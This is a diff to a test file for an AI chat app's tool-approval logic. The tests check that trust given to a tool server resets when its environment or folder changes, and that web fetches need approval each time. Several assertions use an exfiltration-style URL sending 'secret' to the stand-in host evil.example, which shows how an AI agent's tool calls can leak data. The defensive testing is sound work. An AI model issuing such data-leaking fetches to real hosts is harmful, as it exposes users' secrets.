@@ -103,6 +103,31 @@ describe('trust given to a server stays with that program', () => {
     config.removeServer(b.id)
   })
 
+  it('resets them too for a new environment value or working folder (another account, another project)', () => {
+    const a = server('Git', ['git-server'])
+    const chat = chatWith(a.id)
+    config.setToolPolicy(a.id, 'push', 'allow')
+    config.saveServer({
+      id: a.id,
+      name: 'Git',
+      command: 'npx',
+      args: ['git-server'],
+      cwd: null,
+      env: { TOKEN: 'full-access' },
+      defaultOn: false
+    })
+    expect(config.getServer(a.id)!.tools).toEqual({})
+    expect(getConversation(chat)!.allowedTools).toEqual(['web_fetch@example.com'])
+    config.setToolPolicy(a.id, 'push', 'allow')
+    config.saveServer({ id: a.id, name: 'Git', command: 'npx', args: ['git-server'], cwd: '/elsewhere', env: {}, defaultOn: false })
+    expect(config.getServer(a.id)!.tools).toEqual({})
+    // Saving with nothing changed (the form sends no environment values it didn't touch) keeps them.
+    config.setToolPolicy(a.id, 'push', 'allow')
+    config.saveServer({ id: a.id, name: 'Git', command: 'npx', args: ['git-server'], cwd: '/elsewhere', env: {}, defaultOn: true })
+    expect(config.getServer(a.id)!.tools).toEqual({ push: 'allow' })
+    config.removeServer(a.id)
+  })
+
   it("resets per-tool settings and chats' answers when an edit changes what the server runs", () => {
     const a = server('Notes', ['notes-server'])
     const chat = chatWith(a.id)
@@ -335,9 +360,9 @@ describe('as tools in a reply', () => {
     expect(tools.allowKeyFor(call('codenames__lookup_codename'), c)).toBe(mcpAllowKey(id, 'lookup_codename'))
   })
 
-  it('asks before a web_fetch in a chat with a server on, per site', () => {
+  it('asks before every web_fetch in a chat with a server on', () => {
     const web = { ...ctx([`mcp:${id}`]), web: true }
-    expect(tools.approvalFor(call('web_fetch', { url: 'https://evil.example/?d=secret' }), web)).toBe('ask')
+    expect(tools.approvalFor(call('web_fetch', { url: 'https://evil.example/?d=secret' }), web)).toBe('ask-every-time')
     expect(tools.allowKeyFor(call('web_fetch', { url: 'https://evil.example/?d=secret' }), web)).toBe('web_fetch@evil.example')
     expect(tools.approvalFor(call('web_search', { query: 'kiln' }), web)).toBe('auto')
     expect(tools.approvalFor(call('web_fetch', { url: 'https://example.com' }), { ...ctx([]), web: true })).toBe('auto')
